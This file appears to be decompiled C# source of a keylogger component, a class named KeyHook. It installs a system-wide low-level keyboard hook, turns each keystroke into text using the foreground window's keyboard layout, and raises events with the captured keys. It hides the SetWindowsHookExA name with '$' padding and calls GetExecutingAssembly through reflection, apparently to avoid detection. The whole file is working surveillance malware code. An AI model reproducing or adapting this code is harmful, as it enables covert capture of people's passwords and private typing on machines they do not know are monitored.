using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;

// Token: 0x02000014 RID: 20
internal class KeyHook
{
	// Token: 0x06000069 RID: 105 RVA: 0x00004A10 File Offset: 0x00003A10
	public KeyHook()
	{
		this.Alpahbet = false;
		this.Digits = false;
		this.SpecialSymbols = false;
	}

	// Token: 0x0600006A RID: 106
	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwƝīğĻŹŔŠŨ);

	// Token: 0x0600006B RID: 107
	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	// Token: 0x0600006C RID: 108
	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	// Token: 0x0600006D RID: 109
	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	// Token: 0x0600006E RID: 110
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int dwLayout);

	// Token: 0x0600006F RID: 111
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	// Token: 0x06000070 RID: 112
	[DllImport("user32", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int Hook);

	// Token: 0x14000001 RID: 1
	// (add) Token: 0x06000071 RID: 113 RVA: 0x00004A30 File Offset: 0x00003A30
	// (remove) Token: 0x06000072 RID: 114 RVA: 0x00004A4C File Offset: 0x00003A4C
	public event KeyHook.DownEventHandler Down;

	// Token: 0x14000002 RID: 2
	// (add) Token: 0x06000073 RID: 115 RVA: 0x00004A68 File Offset: 0x00003A68
	// (remove) Token: 0x06000074 RID: 116 RVA: 0x00004A84 File Offset: 0x00003A84
	public event KeyHook.UpEventHandler Up;

	// Token: 0x06000075 RID: 117 RVA: 0x00004AA0 File Offset: 0x00003AA0
	public void CreateHook()
	{
		string name = "GetExecutingAssembly";
		Assembly assembly = (Assembly)typeof(Assembly).GetMethod(name).Invoke(null, null);
		int hmod = Marshal.GetHINSTANCE(this.Get_Modules(ref assembly)).ToInt32();
		KeyHook.Key = KeyHook.SetWindowsHookExA(13, KeyHook.KHD, hmod, 0);
	}

	// Token: 0x06000076 RID: 118 RVA: 0x00004B08 File Offset: 0x00003B08
	public Module Get_Modules(ref Assembly _Assembly)
	{
		KeyHook.KHD = new KeyHook.KDel(this.Proc);
		return _Assembly.GetModules()[0];
	}

	// Token: 0x06000077 RID: 119 RVA: 0x00004B38 File Offset: 0x00003B38
	public void DiposeHook()
	{
		KeyHook.UnhookWindowsHookEx(KeyHook.Key);
		base.Finalize();
	}

	// Token: 0x06000078 RID: 120 RVA: 0x00004B4C File Offset: 0x00003B4C
	private int Proc(int Code, int wParam, ref KeyHook.KeyStructure lParam)
	{
		if (Code == 0)
		{
			switch (wParam)
			{
			case 256:
			case 260:
			{
				KeyHook.DownEventHandler downEvent = this.DownEvent;
				if (downEvent != null)
				{
					downEvent(this.Feed((Keys)lParam.Code));
				}
				break;
			}
			case 257:
			case 261:
			{
				KeyHook.UpEventHandler upEvent = this.UpEvent;
				if (upEvent != null)
				{
					upEvent(this.Feed((Keys)lParam.Code));
				}
				break;
			}
			}
		}
		return KeyHook.CallNextHookExA(KeyHook.Key, Code, wParam, ref lParam);
	}

	// Token: 0x06000079 RID: 121 RVA: 0x00004BD4 File Offset: 0x00003BD4
	private string Feed(Keys k)
	{
		this.Alpahbet = true;
		this.Digits = true;
		this.SpecialSymbols = true;
		Keys modifierKeys = Control.ModifierKeys;
		Keys keys = Keys.Shift;
		checked
		{
			string result;
			if (k >= Keys.A && k <= Keys.Z)
			{
				if (this.Alpahbet)
				{
					if (this.Is_Locked() | (modifierKeys & keys) != Keys.None)
					{
						result = this.VKCodeToUnicode((uint)k);
					}
					else
					{
						string value = this.VKCodeToUnicode((uint)k);
						result = Strings.LCase(value);
					}
				}
				else
				{
					result = null;
				}
			}
			else if (k >= Keys.D0 && k <= Keys.D9)
			{
				if ((modifierKeys & keys) != Keys.None)
				{
					result = this.VKCodeToUnicode((uint)k);
				}
				else
				{
					result = k.ToString().Replace("D", null);
				}
			}
			else if (k >= Keys.NumPad0 && k <= Keys.NumPad9)
			{
				if (this.Digits)
				{
					result = this.VKCodeToUnicode((uint)k).Replace("NumPad", null);
				}
				else
				{
					result = null;
				}
			}
			else if (k == Keys.LShiftKey)
			{
				result = null;
			}
			else if (k == Keys.RShiftKey)
			{
				result = null;
			}
			else if (k == Keys.Capital)
			{
				result = null;
			}
			else if (k == Keys.Prior)
			{
				result = null;
			}
			else if (k == Keys.Next)
			{
				result = null;
			}
			else if (k == Keys.Home)
			{
				result = null;
			}
			else if (k == Keys.End)
			{
				result = null;
			}
			else if (k == Keys.LMenu)
			{
				result = this.Get_Alt();
			}
			else if (k == Keys.RMenu)
			{
				result = this.Get_Alt();
			}
			else if (k == Keys.Apps)
			{
				result = "[Apps]";
			}
			else if (k == Keys.LControlKey)
			{
				result = this.Get_Ctrl();
			}
			else if (k == Keys.RControlKey)
			{
				result = this.Get_Ctrl();
			}
			else if (k == Keys.Return)
			{
				result = Environment.NewLine;
			}
			else if (k == Keys.Back)
			{
				result = "[Back]";
			}
			else
			{
				result = this.VKCodeToUnicode((uint)k);
			}
			return result;
		}
	}

	// Token: 0x0600007A RID: 122 RVA: 0x00004DF4 File Offset: 0x00003DF4
	public bool Is_Locked()
	{
		return Control.IsKeyLocked(Keys.Capital);
	}

	// Token: 0x0600007B RID: 123 RVA: 0x00004E0C File Offset: 0x00003E0C
	public string Get_Ctrl()
	{
		return "[Ctrl]";
	}

	// Token: 0x0600007C RID: 124 RVA: 0x00004E24 File Offset: 0x00003E24
	public string Get_Alt()
	{
		return "[Alt]";
	}

	// Token: 0x0600007D RID: 125 RVA: 0x00004E3C File Offset: 0x00003E3C
	private string VKCodeToUnicode(uint V_Code)
	{
		try
		{
			uint b = KeyHook.MapVirtualKey(V_Code, 0u);
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			if (!KeyHook.GetKeyboardState(array))
			{
				return "";
			}
			IntPtr foregroundWindow = KeyHook.GetForegroundWindow();
			int num = 0;
			int windowThreadProcessId = KeyHook.GetWindowThreadProcessId(foregroundWindow, ref num);
			IntPtr g = (IntPtr)KeyHook.GetKeyboardLayout(windowThreadProcessId);
			this.To_Unicode(V_Code, b, array, stringBuilder, 5, 0u, g);
			return stringBuilder.ToString();
		}
		catch (Exception ex)
		{
		}
		return (checked((Keys)V_Code)).ToString();
	}

	// Token: 0x0600007E RID: 126 RVA: 0x00004EE4 File Offset: 0x00003EE4
	public int To_Unicode(uint A, uint B, byte[] C, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder D, int E, uint F, IntPtr G)
	{
		return KeyHook.ToUnicodeEx(A, B, C, D, E, F, G);
	}

	// Token: 0x04000031 RID: 49
	private static readonly KeyHook.SetWindowsHookEx SetWindowsHookExA = Dynamic.CreateApi<KeyHook.SetWindowsHookEx>("user32", "$Set$Window$sHook$Ex$A$".Replace("$", ""));

	// Token: 0x04000032 RID: 50
	private static readonly KeyHook.CallNextHookEx CallNextHookExA = Dynamic.CreateApi<KeyHook.CallNextHookEx>("user32", "CallNextHookEx");

	// Token: 0x04000035 RID: 53
	private static int Key;

	// Token: 0x04000036 RID: 54
	private static KeyHook.KDel KHD;

	// Token: 0x04000037 RID: 55
	public bool Alpahbet;

	// Token: 0x04000038 RID: 56
	public bool Digits;

	// Token: 0x04000039 RID: 57
	public bool SpecialSymbols;

	// Token: 0x02000024 RID: 36
	// (Invoke) Token: 0x060000B3 RID: 179
	private delegate int SetWindowsHookEx(int Hook, KeyHook.KDel KeyDelegate, int HMod, int ThreadId);

	// Token: 0x02000025 RID: 37
	// (Invoke) Token: 0x060000B7 RID: 183
	private delegate int CallNextHookEx(int Hook, int nCode, int wParam, ref KeyHook.KeyStructure lParam);

	// Token: 0x02000026 RID: 38
	// (Invoke) Token: 0x060000BB RID: 187
	private delegate int KDel(int nCode, int wParam, ref KeyHook.KeyStructure lParam);

	// Token: 0x02000027 RID: 39
	// (Invoke) Token: 0x060000BF RID: 191
	public delegate void DownEventHandler(string Key);

	// Token: 0x02000028 RID: 40
	// (Invoke) Token: 0x060000C3 RID: 195
	public delegate void UpEventHandler(string Key);

	// Token: 0x02000029 RID: 41
	private struct KeyStructure
	{
		// Token: 0x0400004A RID: 74
		public int Code;

		// Token: 0x0400004B RID: 75
		public int ScanCode;

		// Token: 0x0400004C RID: 76
		public int Flags;

		// Token: 0x0400004D RID: 77
		public int Time;

		// Token: 0x0400004E RID: 78
		public int ExtraInfo;
	}
}
